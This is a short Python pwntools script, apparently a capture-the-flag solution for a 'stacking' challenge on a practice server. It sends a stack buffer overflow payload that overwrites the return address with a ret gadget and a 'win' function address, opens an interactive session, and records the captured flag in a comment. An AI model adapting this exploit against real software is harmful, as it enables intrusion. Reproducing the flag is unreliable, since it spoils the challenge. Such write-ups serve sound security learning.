from pwn import *

#gadgets
ret = p64(0x0000000000401479)
win = p64(0x00000000004012e5)

def main():
	### run ###
	#p = process('./stacking')
	p = remote('pwnable.co.il', 9009)

	### payload ###
	paylod = b'\x00' * 56 + ret + win 
	p.sendline(paylod)
	p.interactive()

if __name__ == "__main__":
	main()

#flag: PWNIL{I_never_understood_the_difference_between_overflow_and_underflow...}